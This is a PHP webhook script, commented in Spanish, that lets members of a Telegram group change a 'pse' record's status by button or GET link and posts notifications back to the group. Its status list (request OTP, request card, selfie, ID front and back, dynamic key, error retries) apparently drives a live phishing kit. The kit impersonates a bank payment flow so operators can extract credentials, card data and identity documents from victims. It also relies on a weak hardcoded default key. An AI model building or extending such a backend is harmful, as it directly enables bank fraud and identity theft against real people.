<?php
// updatetele.php — Manejador de Webhook de Telegram y peticiones GET
error_reporting(0);

// Cargar config y DB
if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/config/config.php';
}
$conn = require __DIR__ . '/config/db.php';

$security_key = $config['security_key'] ?? 'secure_key_123';
$bot_token    = $config['botToken'] ?? '';
$chat_id      = $config['chatId'] ?? '';

// Mapeo de nombres de acciones humanas
$actionNames = [
    1  => '⏳ En Espera',
    2  => '⚠️ Usuario Incorrecto',
    3  => '🔑 Solicitar OTP',
    4  => '⚠️ OTP Error',
    5  => '💳 Solicitar Tarjeta',
    6  => '⚠️ Tarjeta Error',
    7  => '✅ Finalizar',
    8  => '📲 WhatsApp',
    9  => '🤳 Selfie',
    10 => '⚠️ Selfie Error',
    11 => '🪪 Documento Frente',
    12 => '🪪 Documento Reverso',
    13 => '⚠️ Doc Frente Error',
    14 => '⚠️ Doc Reverso Error',
    15 => '🔐 Clave Dinámica',
    16 => '⚠️ Clave Dinámica Error'
];

// Helper para enviar mensajes a Telegram
function sendTelegramMsg($botToken, $chatId, $text) {
    if (!$botToken || !$chatId) return;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Helper para responder Callback Query (popup en Telegram)
function answerTelegramCallback($botToken, $callbackId, $text) {
    if (!$botToken || !$callbackId) return;
    $url = "https://api.telegram.org/bot{$botToken}/answerCallbackQuery";
    $postData = [
        'callback_query_id' => $callbackId,
        'text'              => $text,
        'show_alert'        => false
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// 1. PROCESAR WEBHOOK DE TELEGRAM (callback_query)
$input = file_get_contents('php://input');
if ($input) {
    $update = json_decode($input, true);
    if (isset($update['callback_query'])) {
        $cb = $update['callback_query'];
        $callbackId = $cb['id'] ?? '';
        $data = $cb['data'] ?? ''; // Formato esperado: "cmd_{estado}_{id}"
        
        // Extraer usuario de Telegram que hizo clic
        $firstName = $cb['from']['first_name'] ?? 'Integrante';
        $lastName  = $cb['from']['last_name'] ?? '';
        $username  = isset($cb['from']['username']) && !empty($cb['from']['username']) ? '@' . $cb['from']['username'] : '';
        $who = trim("$firstName $lastName $username");

        if (preg_match('/^cmd_(\d+)_(\d+)$/', $data, $matches)) {
            $estado = intval($matches[1]);
            $id     = intval($matches[2]);

            // Actualizar en base de datos
            try {
                $stmt = $conn->prepare("UPDATE pse SET estado = :estado WHERE id = :id");
                $stmt->execute(['estado' => $estado, 'id' => $id]);
            } catch (Exception $e) {}

            $actionName = $actionNames[$estado] ?? "Estado $estado";

            // Enviar respuesta popup al usuario
            answerTelegramCallback($bot_token, $callbackId, "Acción: $actionName");

            // Enviar notificación al grupo con el nombre del integrante y la acción
            $notifyText  = "<b>🔔 Acción Ejecutada en el Grupo</b>\n\n";
            $notifyText .= "👤 <b>Integrante:</b> " . htmlspecialchars($who) . "\n";
            $notifyText .= "⚡ <b>Acción:</b> " . htmlspecialchars($actionName) . "\n";
            $notifyText .= "🆔 <b>ID Cliente:</b> #" . $id;

            sendTelegramMsg($bot_token, $chat_id, $notifyText);
            echo "OK";
            exit();
        }
    }
}

// 2. PROCESAR PETICIÓN GET (Panel web / Links directos)
if (isset($_GET['id'], $_GET['estado'], $_GET['key']) && $_GET['key'] === $security_key) {
    $id     = intval($_GET['id']);
    $estado = intval($_GET['estado']);
    $byUser = isset($_GET['by']) ? trim($_GET['by']) : 'Integrante / Panel';

    try {
        $stmt = $conn->prepare("UPDATE pse SET estado = :estado WHERE id = :id");
        $stmt->execute(['estado' => $estado, 'id' => $id]);
    } catch (Exception $e) {}

    $actionName = $actionNames[$estado] ?? "Estado $estado";

    // Enviar mensaje al grupo de Telegram indicando la acción y quién la ejecutó
    $notifyText  = "<b>🔔 Acción Ejecutada en Botón</b>\n\n";
    $notifyText .= "👤 <b>Ejecutado por:</b> " . htmlspecialchars($byUser) . "\n";
    $notifyText .= "⚡ <b>Acción:</b> " . htmlspecialchars($actionName) . "\n";
    $notifyText .= "🆔 <b>ID Cliente:</b> #" . $id;

    sendTelegramMsg($bot_token, $chat_id, $notifyText);

    http_response_code(200);
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>body{background:#0f172a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
</head><body>
<p>✅ Estado actualizado a: ' . htmlspecialchars($actionName) . '</p>
<script>setTimeout(() => window.close(), 1000);</script>
</body></html>';
    exit();
} else {
    http_response_code(403);
    echo 'Acceso no autorizado o parámetros inválidos.';
}
?>